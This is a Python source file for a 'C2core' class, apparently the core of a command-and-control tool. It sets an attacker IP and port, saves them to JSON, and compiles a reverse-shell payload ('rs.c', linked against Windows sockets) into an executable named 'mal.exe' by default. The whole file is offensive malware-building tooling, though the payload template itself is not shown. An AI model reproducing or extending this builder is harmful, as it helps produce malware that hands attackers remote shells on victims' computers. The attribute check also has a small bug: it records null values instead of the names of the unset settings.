from utils.PL import PayloadLoader, IpAndPort
import json
import os
import subprocess


class C2core:
    __payloads = PayloadLoader()
    __settings = {"ip": None, "port": None, "x64gcc": None, "x86gcc": None}

    def __init__(self, ip=None, port=None) -> None:
        """Initialize the object.

        Args:
            ip (str, optional): ip. Defaults to None.
            port (int, optional): port. Defaults to None.
        """
        self.__settings["ip"] = ip
        self.__settings["port"] = port

    def CheckAttributes(self) -> list:
        """Check settings attributes.

        Returns:
            list: list of the null attributes.
        """
        NullAttributes = []

        for attr in self.__settings.keys():
            if self.__settings[attr] is None:
                NullAttributes.append(self.__settings[attr])

        return NullAttributes

    def SetAttributes(self, attribute: str, value) -> bool:
        """set settings attribute to a value

        Args:
            attribute (str): settings attribute
            value (_type_): value

        Raises:
            TypeError: if attribute not in settings

        Returns:
            bool: boolen
        """
        if attribute not in self.__settings.keys():
            raise TypeError
        if attribute == "port":
            self.__settings[attribute] = int(value)
        else:
            self.__settings[attribute] = value.lower()

    def ListAll(self, name: str) -> dict:
        """List payloads or settings.

        Args:
            name (str): what to list.

        Returns:
            dict: dict contains the requested info
        """
        if name == "settings":
            return self.__settings
        elif name == "payloads":
            return self.__payloads

    def settings(self, method: str, name="settings.json") -> bool:
        """Load and save settings

        Args:
            method (str): method needs to be performed. (load, save).
            name (str, optional): name of the file. Defaults to "settings.json".

        Raises:
            FileExistsError: if the file exists.
            FileNotFoundError: if the file does not exists.

        Returns:
            bool: True if saved, false if not
        """

        if method.lower() == "save":
            if name[-5:] == ".json":
                if os.path.exists(name):
                    raise FileExistsError
                file = open(name, "w")
                json.dump(self.__settings, file, indent=4)
                file.close()
                return True
            return False
        if method.lower() == "load":
            if not os.path.exists(name):
                raise FileNotFoundError
            file = open(name, "r")
            self.__settings = json.loads(file.read())
            file.close()

    def compile(self, architecture: str, payload: str, name="mal.exe") -> str:
        """Compile the reverse shell

        Args:
            architecture (str): reverse shell executeable architecture.
            payload (str): reverse shell payload
            name (str, optional): name of the executable. Defaults to "mal.exe".

        Returns:
            str: output of the compilation result
        """
        if architecture == "64":
            compiler = "x64gcc"
        else:
            compiler = "x86gcc"

        IpAndPort(payload, self.__settings["ip"], self.__settings["port"])
        CompilationResult = subprocess.run([self.__settings[compiler], "rs.c", "-lws2_32", "-o", name], stderr=subprocess.PIPE)
        os.remove("rs.c")
        if CompilationResult.returncode == 0:
            return "Done."
        else:
            return f"Compilation failed with the following error:\n {CompilationResult.stderr.decode('utf-8')}"
